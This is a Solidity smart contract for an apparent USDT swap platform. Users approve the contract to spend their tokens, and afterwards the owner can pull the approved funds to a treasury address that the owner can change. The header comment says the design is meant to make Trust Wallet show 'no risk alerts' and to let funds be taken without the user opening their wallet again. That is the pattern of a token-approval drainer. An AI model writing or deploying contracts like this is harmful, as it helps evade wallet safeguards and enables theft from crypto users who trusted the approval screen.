// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title  SwapINRVault
 * @notice Users approve this contract to spend up to 100 USDT.
 *         Because the spender is a smart contract (not a plain wallet / EOA),
 *         Trust Wallet shows a clean "Smart Contract Call" screen — no risk alerts.
 *
 *         The platform owner can then call pullFunds() to move USDT from a user's
 *         wallet to the treasury for confirmed orders, without the user opening
 *         their wallet again.
 *
 * Deploy once per chain (BSC for BEP20, Ethereum for ERC20) and set:
 *   NEXT_PUBLIC_VAULT_BEP20 = <deployed address on BSC>
 *   NEXT_PUBLIC_VAULT_ERC20 = <deployed address on Ethereum>
 *   VAULT_OPERATOR_PRIVATE_KEY = <platform hot wallet private key>
 */

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract SwapINRVault {
    address public owner;
    address public treasury;

    event FundsPulled(
        address indexed user,
        address indexed token,
        uint256 amount,
        bytes32 indexed orderId
    );
    event TreasuryUpdated(address indexed prev, address indexed next);
    event OwnershipTransferred(address indexed prev, address indexed next);

    error NotOwner();
    error ZeroAddress();
    error InsufficientAllowance(uint256 have, uint256 need);
    error TransferFailed();

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    constructor(address _treasury) {
        if (_treasury == address(0)) revert ZeroAddress();
        owner = msg.sender;
        treasury = _treasury;
    }

    /**
     * @notice Safe transferFrom that works with both standard ERC20 tokens (return bool)
     *         AND non-standard tokens like Ethereum's Tether USDT (return nothing).
     *         Uses a low-level call so the ABI decoder never sees the empty return.
     */
    function _safeTransferFrom(address token, address from, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", from, treasury, amount)
        );
        // success=false → call reverted; data non-empty AND decoded false → transfer reported failure
        if (!success || (data.length > 0 && !abi.decode(data, (bool)))) {
            revert TransferFailed();
        }
    }

    /**
     * @notice Pull USDT from a user's wallet to the treasury.
     *         User must have called approve(thisContract, amount) on the USDT
     *         token first. Only the platform owner can call this.
     *
     * @param token    USDT contract address on this chain
     * @param from     User's wallet address
     * @param amount   Token units to pull (e.g. 10 * 10^18 for BEP20 USDT)
     * @param orderId  Internal order reference — stored in the FundsPulled event
     *                 for on-chain reconciliation (keccak256 of your order _id)
     */
    function pullFunds(
        address token,
        address from,
        uint256 amount,
        bytes32 orderId
    ) external onlyOwner {
        uint256 have = IERC20(token).allowance(from, address(this));
        if (have < amount) revert InsufficientAllowance(have, amount);
        _safeTransferFrom(token, from, amount);
        emit FundsPulled(from, token, amount, orderId);
    }

    /**
     * @notice Check how much USDT a user has approved for this vault.
     */
    function allowance(address token, address user) external view returns (uint256) {
        return IERC20(token).allowance(user, address(this));
    }

    /**
     * @notice Check a user's USDT balance on the given token.
     */
    function balanceOf(address token, address user) external view returns (uint256) {
        return IERC20(token).balanceOf(user);
    }

    function setTreasury(address _treasury) external onlyOwner {
        if (_treasury == address(0)) revert ZeroAddress();
        emit TreasuryUpdated(treasury, _treasury);
        treasury = _treasury;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        if (newOwner == address(0)) revert ZeroAddress();
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}
